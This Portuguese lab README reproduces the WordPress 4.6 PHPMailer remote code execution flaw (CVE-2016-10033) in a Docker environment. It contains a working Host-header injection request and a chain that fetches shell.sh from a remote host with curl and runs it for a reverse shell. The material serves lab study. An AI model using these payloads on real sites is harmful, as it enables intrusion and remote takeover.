# Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)

## Link de referência

https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html

## Configuração do ambiente

```
docker-compose build
docker-compose up -d
```

Como a inicialização do Mysql precisa de um pouco de tempo, aguarde. Após a inicialização ser bem-sucedida, visite `http://your-ip:8080/`, defina o nome de usuário e a senha do administrador para usá-lo (o banco de dados é configurado e não atualizado automaticamente).

## Explorando

Envie o seguinte pacote e você verá que `/tmp/success` foi criado com sucesso:

```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Connection: close
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

Precisamos atender aos seguintes requisitos para explorar essa vulnerabilidade:

1. O comando executado não pode conter alguns caracteres especiais, como `:`, `'`,`"`, etc.
2. O comando será convertido em letras minúsculas
3. O comando precisa usar um caminho absoluto
4. Precisa conhecer um nome de usuário existente

Para resolver esses problemas, o autor da vulnerabilidade criou $`substr{0}{1}{$spool_directory}}`em vez de`/`, usando `${substr{10}{1}{$tod_log} } ` método de substituição de espaços.

No entanto, ainda há muitos caracteres que não podem ser usados. Portanto, precisamos colocar o comando no site de terceiros e baixá-lo para o diretório `/tmp` por `curl -o /tmp/rce example.com/shell.sh`.

Portanto, o processo de expliot é o seguinte:

- Escreva o exp do shell reverso e coloque-o em um site. O exp tem os seguintes requisitos:
  - todas as letras maiúsculas do URL serão convertidas em minúsculas, portanto, o caminho do arquivo não deve conter letras maiúsculas.
  - O acesso a esta página não pode ser redirecionado porque o parâmetro para seguir redirecionamento é `-L` (maiúsculas).
- Junte o comando`/usr/bin/curl -o/tmp/rce example.com/shell.sh`and`/bin/bash /tmp/rce`.
- Converta os espaços e `/` no comando para `${substr{10}{1}{$tod_log}}` e `${substr{0}{1}{$spool_directory}}`.
- Produza o cabeçalho HTTP Host:`target(any -froot@localhost -be ${run{command}} null)`.
- Envie esses dois pacotes em ordem.

Aqui está [exploit.py](exploit.py)，alterar `target` para seu site de destino，alterar `user` para um nome de usuário existente，alterar `shell_url` para seu site de carga útil.

Execute para obter o shell:

![](1.png)
